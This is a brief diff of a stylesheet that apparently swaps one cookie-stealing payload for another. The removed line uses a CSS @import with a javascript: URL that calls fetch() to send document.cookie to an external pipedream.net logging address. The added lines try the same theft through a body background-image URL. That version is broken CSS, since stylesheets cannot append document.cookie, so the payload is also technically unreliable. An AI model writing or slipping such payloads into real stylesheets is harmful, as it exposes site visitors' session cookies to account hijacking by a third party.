@@ -1,1 +1,3 @@
-@import url("javascript:fetch('https://eo10sr0fi9sxhnf.m.pipedream.net/log?cookie=' + document.cookie)");
+body {
+  background-image: url("https://eo10sr0fi9sxhnf.m.pipedream.net/log?cookie=" + document.cookie);
+}
